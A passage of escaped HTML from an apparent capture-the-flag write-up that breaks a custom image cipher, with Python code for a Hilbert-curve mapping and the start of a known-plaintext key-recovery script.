style=\"--0:#B392F0\">gen\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">yield\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sox(n, i)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> turtle\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">draw_path\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_, square_size):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">screen \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> turtle.Screen()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">screen.setup(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">800\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">800\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.penup()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.speed(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> point \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> gen():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> point[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> square_size \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> square_size \u003C/span>\u003Cspan style=\"--0:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> point[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> square_size \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> square_size \u003C/span>\u003Cspan style=\"--0:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">off \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">10\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> square_size\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.goto(x \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> off, y \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> off)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.pendown()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.dot(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.hideturtle()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">turtle.done()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">draw_path(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">...\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"def sox(n, d):  x, y, t = 0, 0, d  for s in range(n - 1):    u = 1 &#x26; t // 2    v = 1 &#x26; t ^ u    x, y = spin(2**s, x, y, u, v)    x += 2**s * u    y += 2**s * v    t = t // 4  return x, ydef spin(n, x, y, u, v):  if v == 0:    if u == 1:      x = n - 1 - x      y = n - 1 - y    x, y = y, x  return x, yn = 256def gen():    for i in range(n**2):        yield sox(n, i)import turtledef draw_path(_, square_size):    screen = turtle.Screen()    screen.setup(800, 800)    turtle.penup()    turtle.speed(0)    for point in gen():        x = point[0] * square_size + square_size / 2        y = point[1] * square_size + square_size / 2        off = 10 * square_size        turtle.goto(x - off, y - off)        turtle.pendown()        turtle.dot(2)    turtle.hideturtle()    turtle.done()draw_path(..., 4)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>It immediately becomes quite clear that it’s a Hilbert curve, a 2d space filling curve, or a unique map from a number to a 2d point. The main usefulness of this knowledge is that we can assume the image pixels have a one-to-one (therefore invertable) mapping to the message.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;image.png&#x22;,&#x22;alt&#x22;:&#x22;turtle&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>The next observation is that the positions of bits in the initial message, and the final message will always be the same \u003Cstrong>if\u003C/strong> the confusion permutation is the same. This is clear since the ascii ordering of the key is the only thing that affects the order of the bits. The operations otherwise will be the same regardless of the message.\u003C/p>\n\u003Cp>Finally, we know that the same index of the key will always affect the same character of the message in each round of the encryption. This with the above information tells us that we can do a known plaintext attack to figure out the original message. We can test each 6 possible permutations and 4 possible image rotations to try and recover the key.\u003C/p>\n\u003Cp>To figure out how the confusion array and key affect an input, I modified the encrypt function like so.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">do\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, msg, key, sl\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> padd(msg, n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\0\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg, _key \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _msg], [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(key)):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">w \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_key)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">h \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [[_msg[w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y] \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(h)] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sl:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_conf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sorted\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([(_key[i], i) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_conf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sorted\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([(_key[i], i, sl[i]) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)], \u003C/span>\u003Cspan style=\"--0:#FFAB70\">key\u003C/span>\u003Cspan style=\"--0:#F97583\">=lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x: x[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_marshal \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [arr[_conf[i][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools.reduce(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> a, r: a \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _marshal[r], \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w), [])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">list\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">filter\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x: x \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, _msg))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [(_msg[_] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _key[_ \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w]) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _msg\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"def do(n, msg, key, sl=None):  _msg = padd(msg, n**2, &#x27;\\0&#x27;)  _msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]  for _ in range(len(key)):    w = len(_key)    h = n**2 // w + 1    arr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]    if not sl:      _conf = sorted([(_key[i], i) for i in range(w)])    else:      _conf = sorted([(_key[i], i, sl[i]) for i in range(w)], key=lambda x: x[2])    _marshal = [arr[_conf[i][1]] for i in range(w)]    _msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])    _msg = list(filter(lambda x: x is not None, _msg))    _msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]  return _msg\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>This can then be used like this to get alot of information needed to solve a particular permutation case.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'ABCDE'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">TEMP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\1\\2\\3\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">baseline \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> do(n, msg, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\0\\0\\0\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TEMP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">base \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> []\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">l \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> []\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i, v \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">enumerate\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(baseline):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan 